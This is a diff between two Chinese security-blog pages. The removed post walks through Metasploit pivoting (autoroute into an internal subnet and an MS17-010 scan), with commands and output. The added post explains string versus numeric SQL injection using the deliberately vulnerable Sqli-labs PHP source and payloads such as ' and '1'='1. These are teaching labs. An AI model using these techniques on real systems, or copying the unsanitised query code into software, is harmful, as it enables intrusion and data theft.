@@ -49,7 +49,7 @@
     
     <title>
         
-            Meterpreter实现网络穿透 | 
+            从Sqlilabs的Less1和Less2看字符型和数字型注入 | 
         
         AresX&#39;s Blog
     </title>
@@ -60,7 +60,7 @@
 
     <meta name="format-detection" content="telephone=no"/>
     <meta name="description" itemprop="description" content="There is no description">
-    <meta name="keywords" content="AresX&#39;s Blog,AresX,Aresx 博客,Meterpreter,网络穿透">
+    <meta name="keywords" content="AresX&#39;s Blog,AresX,Aresx 博客,SQL注入">
     <meta name="theme-color" content="#0097A7">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -221,7 +221,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="AresX&#39;s Blog">
-    <meta name="msapplication-starturl" content="https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/">
+    <meta name="msapplication-starturl" content="https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/">
     <meta name="msapplication-navbutton-color" content="#0097A7">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="AresX&#39;s Blog">
@@ -236,16 +236,16 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/">
+    <meta property="og:url" content="https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Meterpreter实现网络穿透 | AresX&#39;s Blog">
+    <meta property="og:title" content="从Sqlilabs的Less1和Less2看字符型和数字型注入 | AresX&#39;s Blog">
     <meta property="og:image" content="https://cache-1253916356.file.myqcloud.com/img/favicon.png">
     <meta property="og:description" content="There is no description">
-    <meta property="og:article:tag" content="Meterpreter"> <meta property="og:article:tag" content="网络穿透"> 
+    <meta property="og:article:tag" content="SQL注入"> 
 
     
-        <meta property="article:published_time" content="Sat May 05 2018 23:43:59 GMT+0800">
-        <meta property="article:modified_time" content="Sat May 05 2018 23:46:46 GMT+0800">
+        <meta property="article:published_time" content="Wed May 09 2018 21:50:49 GMT+0800">
+        <meta property="article:modified_time" content="Wed May 09 2018 21:52:27 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -253,7 +253,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/index.html" />
+        <link rel="canonical" href="https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -265,10 +265,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/index.html",
-    "headline": "Meterpreter实现网络穿透",
-    "datePublished": "Sat May 05 2018 23:43:59 GMT+0800",
-    "dateModified": "Sat May 05 2018 23:46:46 GMT+0800",
+    "mainEntityOfPage": "https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/index.html",
+    "headline": "从Sqlilabs的Less1和Less2看字符型和数字型注入",
+    "datePublished": "Wed May 09 2018 21:50:49 GMT+0800",
+    "dateModified": "Wed May 09 2018 21:52:27 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "AresX",
@@ -286,7 +286,7 @@
             "url": "https://cache-1253916356.file.myqcloud.com/img/favicon.png"
         }
     },
-    "keywords": ",Meterpreter,网络穿透AresX&#39;s Blog,AresX,Aresx 博客",
+    "keywords": ",SQL注入AresX&#39;s Blog,AresX,Aresx 博客",
     "description": "There is no description",
 }
 </script>
@@ -350,6 +350,15 @@
     <!-- Left aligned menu below button -->
     
     
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#从Sqli-labs-less1和less2看字符型和数字型注入"><span class="post-toc-number">1.</span> <span class="post-toc-text">从Sqli-labs less1和less2看字符型和数字型注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#源码"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">源码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less1源码"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">less1源码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less2源码"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">less2源码</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#在注入时的区别"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">在注入时的区别</span></a></li></ol></li></ol>
+    </ul>
+    
 
 
 
@@ -367,10 +376,10 @@
     <!-- Paradox Post Header -->
     
         <!-- Custom Thumbnail -->
-        <div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(https://parrotsec-china.org/uploads/default/original/1X/ee91915f9738ee095af3ca235a14a389f92a024b.jpg)">
+        <div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(https://i.loli.net/2018/05/09/5af2fd0be18fb.png)">
     
             <p class="article-headline-p">
-                Meterpreter实现网络穿透
+                从Sqlilabs的Less1和Less2看字符型和数字型注入
             </p>
         </div>
 
@@ -389,7 +398,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>AresX</strong>
-        <span>5月 05, 2018</span>
+        <span>5月 09, 2018</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -413,7 +422,7 @@
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/Meterpreter/">Meterpreter</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/网络穿透/">网络穿透</a>
+        <a class="post_tag-link" href="/tags/SQL注入/">SQL注入</a>
     </ul>
     
 
@@ -441,7 +450,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Meterpreter实现网络穿透&url=https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/index.html&pic=https://ares-x.comhttps://cache-1253916356.file.myqcloud.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=从Sqlilabs的Less1和Less2看字符型和数字型注入&url=https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/index.html&pic=https://ares-x.comhttps://cache-1253916356.file.myqcloud.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -450,7 +459,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Meterpreter实现网络穿透&url=https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/index.html&via=AresX" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=从Sqlilabs的Less1和Less2看字符型和数字型注入&url=https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/index.html&via=AresX" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -459,7 +468,7 @@
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/index.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Facebook
             </li>
@@ -468,7 +477,7 @@
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/index.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Google+
             </li>
@@ -477,7 +486,7 @@
 
     <!-- Share LinkedIn -->
     
-        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/index.html&title=Meterpreter实现网络穿透" target="_blank">
+        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/index.html&title=从Sqlilabs的Less1和Less2看字符型和数字型注入" target="_blank">
             <li class="mdl-menu__item">
                 分享到 LinkedIn
             </li>
@@ -486,7 +495,7 @@
 
     <!-- Share QQ -->
     
-        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=AresX&#39;s Blog&title=Meterpreter实现网络穿透&summary=There is no description&pics=https://ares-x.comhttps://cache-1253916356.file.myqcloud.com/img/favicon.png&url=https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/index.html" target="_blank">
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=AresX&#39;s Blog&title=从Sqlilabs的Less1和Less2看字符型和数字型注入&summary=There is no description&pics=https://ares-x.comhttps://cache-1253916356.file.myqcloud.com/img/favicon.png&url=https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 QQ
             </li>
@@ -495,7 +504,7 @@
 
     <!-- Share Telegram -->
     
-        <a class="post_share-link" href="https://telegram.me/share/url?url=https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/index.html&text=Meterpreter实现网络穿透" target="_blank">
+        <a class="post_share-link" href="https://telegram.me/share/url?url=https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/index.html&text=从Sqlilabs的Less1和Less2看字符型和数字型注入" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Telegram
             </li>
@@ -511,62 +520,230 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <p><strong>场景</strong>:攻击者拿下目标服务器发现目标服务器处于内网环境，内网中有其他服务器<br><strong>目的</strong>:使用已经拿下的服务器作为网络跳板对处于目标内网的其他服务器进行攻击</p>
-<p>使用工具:<code>metasploit</code></p>
-<p>首先局域网内的linux执行后门程序让处于外网的攻击机器收到shell</p>
-<p><img src="https://parrotsec-china.org/uploads/default/original/1X/b3231aa471a8fcb09f5682c1bb3aa3ff94a676e5.jpg" alt="image"></p>
-<p><img src="https://parrotsec-china.org/uploads/default/original/1X/ee91915f9738ee095af3ca235a14a389f92a024b.jpg" alt="image"></p>
-<p>外网的攻击机器拿到shell之后:</p>
-<p>使用<code>get_local_subnets</code>脚本获取肉鸡的网络信息</p>
-<pre><code>meterpreter &gt; run get_local_subnets
-[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
-[!] Example: run post/multi/manage/autoroute OPTION=value [...]
-Local subnet: 172.17.0.0/255.255.0.0
-Local subnet: 192.168.59.0/255.255.255.0
-</code></pre><p>可见内网网段为192.168.59.0/24</p>
-<p>然后使用<code>autoroute</code>模块添加路由</p>
-<pre><code>meterpreter &gt; run autoroute -s 192.168.59.0/24
-[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
-[!] Example: run post/multi/manage/autoroute OPTION=value [...]
-[*] Adding a route to 192.168.59.0/255.255.255.0...
-[+] Added route to 192.168.59.0/255.255.255.0 via 125.65.72.15
-[*] Use the -p option to list all active routes
-meterpreter &gt; run autoroute -p
-[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
-[!] Example: run post/multi/manage/autoroute OPTION=value [...]
-Active Routing Table
-====================
-  Subnet            Netmask            Gateway
-  ------            -------            -------
-  192.168.59.0      255.255.255.0      Session 1
-</code></pre><p>添加完成后返回上一层，这里一定要保证添加了路由规则的sessions的存活,如果sessions掉了对应的路由规则也就失效了</p>
-<p>添加完成后使用ms17010的扫描脚本进行目标内网的扫描，可见ip为192.168.59.132的机器存在ms17010漏洞</p>
-<pre><code>msf auxiliary(scanner/smb/smb_ms17_010) &gt; set THREADS 10
-THREADS =&gt; 10
-msf auxiliary(scanner/smb/smb_ms17_010) &gt; exploit
-^C
-[*] Caught interrupt from the console...
-[*] Auxiliary module execution completed
-msf auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOSTS 192.168.59.0/24
-RHOSTS =&gt; 192.168.59.0/24
-msf auxiliary(scanner/smb/smb_ms17_010) &gt; exploit
-[*] Scanned  27 of 256 hosts (10% complete)
-[*] Scanned  52 of 256 hosts (20% complete)
-[*] Scanned  80 of 256 hosts (31% complete)
-[*] Scanned 103 of 256 hosts (40% complete)
-[*] Scanned 128 of 256 hosts (50% complete)
-[+] 192.168.59.132:445    - Host is likely VULNERABLE to MS17-010!  (Windows 7 Ultimate 7600)
-[*] Scanned 154 of 256 hosts (60% complete)
-[*] Scanned 181 of 256 hosts (70% complete)
-[*] Scanned 205 of 256 hosts (80% complete)
-[*] Scanned 232 of 256 hosts (90% complete)
-[*] Scanned 256 of 256 hosts (100% complete)
-[*] Auxiliary module execution completed
-msf auxiliary(scanner/smb/smb_ms17_010) &gt;
-</code></pre><p>使用漏洞利用脚本直接获取shell</p>
-<p>[<img src="https://parrotsec-china.org/uploads/default/original/1X/5210d54f319dfd0d3c982dcaf46fdd4a0ac2ac41.png" alt="image"></p>
-<hr>
+        <h1 id="从Sqli-labs-less1和less2看字符型和数字型注入"><a href="#从Sqli-labs-less1和less2看字符型和数字型注入" class="headerlink" title="从Sqli-labs less1和less2看字符型和数字型注入"></a>从Sqli-labs less1和less2看字符型和数字型注入</h1><p>Sql注入根据闭合方式分类可以分为:数字型 字符型 搜索型注入这三种</p>
+<p>比较典型的是数字型和字符型,数字型的不需要单引号包裹，但是字符型的就需要单引号包裹</p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h3 id="less1源码"><a href="#less1源码" class="headerlink" title="less1源码"></a>less1源码</h3><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
+&lt;title&gt;Less-1 **Error Based- String**&lt;/title&gt;
+&lt;/head&gt;
 
+&lt;body bgcolor=&quot;#000000&quot;&gt;
+&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
+&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
+
+
+&lt;?php
+//including the Mysql connect parameters.
+include(&quot;../sql-connections/sql-connect.php&quot;);
+error_reporting(0);
+// take the variables
+if(isset($_GET[&#39;id&#39;]))
+{
+$id=$_GET[&#39;id&#39;];
+//logging the connection parameters to a file for analysis.
+$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
+fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
+fclose($fp);
+// connectivity
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+    if($row)
+    {
+      echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;
+      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
+      echo &quot;&lt;br&gt;&quot;;
+      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
+      echo &quot;&lt;/font&gt;&quot;;
+      }
+    else
+    {
+    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
+    print_r(mysql_error());
+    echo &quot;&lt;/font&gt;&quot;; 
+    }
+}
+    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
+?&gt;
+&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
+&lt;img src=&quot;../images/Less-1.jpg&quot; /&gt;&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>查询语句:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+</code></pre><h3 id="less2源码"><a href="#less2源码" class="headerlink" title="less2源码"></a>less2源码</h3><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
+&lt;title&gt;Less-2 **Error Based- Intiger**&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body bgcolor=&quot;#000000&quot;&gt;
+
+
+
+
+&lt;div style=&quot; margin-top:60px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
+&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
+
+
+&lt;?php
+//including the Mysql connect parameters.
+include(&quot;../sql-connections/sql-connect.php&quot;);
+error_reporting(0);
+// take the variables
+if(isset($_GET[&#39;id&#39;]))
+{
+$id=$_GET[&#39;id&#39;];
+//logging the connection parameters to a file for analysis.
+$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
+fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
+fclose($fp);
+// connectivity
+$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+    if($row)
+    {
+      echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;
+      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
+      echo &quot;&lt;br&gt;&quot;;
+      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
+      echo &quot;&lt;/font&gt;&quot;;
+      }
+    else
+    {
+    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
+    print_r(mysql_error());
+    echo &quot;&lt;/font&gt;&quot;; 
+    }
+}
+    else
+        {    
+        echo &quot;Please input the ID as parameter with numeric value&quot;;
+        }
+?&gt;
+
+
+&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
+&lt;img src=&quot;../images/Less-2.jpg&quot; /&gt;&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>查询语句<br>    $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;</p>
+<hr>
+<p>字符型:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+</code></pre><p>数字型:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre><p>区别在于id=xxx这里，一个被单引号包裹，另一个没有被单引号包裹</p>
+<p>一个是id=字符 一个是id=数字，如<code>id=&#39;admin&#39;</code>,<code>id=1</code></p>
+<h2 id="在注入时的区别"><a href="#在注入时的区别" class="headerlink" title="在注入时的区别"></a>在注入时的区别</h2><p>先进入了sqli-labs连接的security数据库查看所有的表名</p>
+<pre><code>mysql&gt; show tables;
++--------------------+
+| Tables_in_security |
++--------------------+
+| emails             |
+| referers           |
+| uagents            |
+| users              |
++--------------------+
+4 rows in set (0.00 sec)
+</code></pre><p>用users表举例,查看表内的所有数据</p>
+<pre><code>mysql&gt; select * from users;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+
+13 rows in set (0.00 sec)
+</code></pre><p>三个字段:<code>id</code>,<code>username</code>,<code>password</code></p>
+<p>除了id这个字段的值全为数字外，剩下两个均为字符串</p>
+<p>再看那两条查询语句</p>
+<p>字符型:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+</code></pre><p>数字型:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre><hr>
+<p>了解一下查询语法:</p>
+<p><strong>SQL SELECT 语法</strong></p>
+<pre><code>SELECT 列名称 FROM 表名称
+符号 * 取代列的名称是选取所有列
+</code></pre><p><strong>WHERE 子句</strong></p>
+<pre><code>如需有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句。
+语法
+SELECT 列名称 FROM 表名称 WHERE 列 运算符 值
+</code></pre><p>where子句相当于对查询进行条件判断,比如:<code>where id=1</code> 就是查询当id=1的时候对应的内容</p>
+<p><code>LIMIT 0,1</code> 就是显示第一条内容</p>
+<hr>
+<p>之前说到id对应的为数字,username对应的为字符,那么上面两条查询语句就可以分别对id和username进行查询</p>
+<p>字符型:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+</code></pre><p>实际查询:</p>
+<pre><code>mysql&gt; select * from users where username=&#39;Dumb&#39;;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+</code></pre><p><em>为了方便就没加Limit语句，不影响结果</em><br>数字型:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre><p>实际查询:</p>
+<pre><code>mysql&gt; select * from users where id=1;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+</code></pre><p>可以看到区别为在字符型注入的时候，注入语句是在两个<code>&#39;</code>包裹之中的</p>
+<p>这时如果注入语句不做处理的话，查询语句就会被单引号包裹起来变为了查询条件<code>username</code>中的一部分，用<code>and 1=1</code>举例</p>
+<p>url请求：<code>xxx.com/x.php?id=Dumb</code></p>
+<p>查询语句:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE username=&#39;Dumb and 1=1&#39; LIMIT 0,1&quot;;
+</code></pre><p>实际查询:</p>
+<pre><code>mysql&gt; select * from users where username =&#39;Dumb and 1=1&#39;;
+Empty set (0.00 sec)
+</code></pre><p>查询结果为空,因为数据库中没有<code>username</code>为<code>Dumb and 1=1</code>的用户</p>
+<p>所以需要用单引号把两边包裹语句的单引号闭合掉，让<code>and 1=1</code>成为正常的查询语句</p>
+<p>Payload:<code>&#39; and &#39;1&#39;=&#39;1</code></p>
+<p>这时候查询语句就变成了:</p>
+<pre><code>SELECT * FROM users WHERE username=&#39;Dumb&#39; and &#39;1&#39;=&#39;1&#39; LIMIT 0,1&quot;;
+</code></pre><p>payload中第一个单引号为了和原有的第一个单引号闭合成<code>&#39;Dumb&#39;</code>,最后一个单引号为了和原有最右边的单引号闭合成为<code>&#39;1&#39;</code>,所以Payload中是两个字符<code>&#39;1&#39;</code>而不是数字1进行的相等判断<br>如果是数字的话就变成了:<code>and 1=1&#39;</code>会多出一个<code>&#39;</code>造成查询失败</p>
+<p>实际查询:</p>
+<pre><code>mysql&gt; select * from users where username =&#39;Dumb&#39; and &#39;1&#39;=&#39;1&#39;;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+</code></pre><p>正常返回了查询结果,测试错误条件<code>and 1=2</code>:</p>
+<pre><code>mysql&gt; select * from users where username =&#39;Dumb&#39; and &#39;1&#39;=&#39;2&#39;;
+Empty set (0.00 sec)
+</code></pre><p>对于数字型，就没有这么多事了，直接加payload就可以</p>
+<pre><code>mysql&gt; select * from users where id =1 and 1=1;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+</code></pre>
         
                 <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
                     <p><strong>
@@ -574,7 +751,7 @@ msf auxiliary(scanner/smb/smb_ms17_010) &gt;
                             本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.转载请注明出处</a>
                         </strong>
                         <br>
-                        <strong>本文链接：</strong><a href="https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/">https://ares-x.com/2018/05/05/Meterpreter实现网络穿透/</a>
+                        <strong>本文链接：</strong><a href="https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/">https://ares-x.com/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/</a>
                     </p>
                 </blockquote>
         
@@ -619,21 +796,13 @@ msf auxiliary(scanner/smb/smb_ms17_010) &gt;
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2018/05/09/从Sqlilabs的Less1和Less2看字符型和数字型注入/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2018/04/18/更换了评论系统/" id="post_nav-older" class="next-content">
+        <a href="/2018/05/05/Meterpreter实现网络穿透/" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
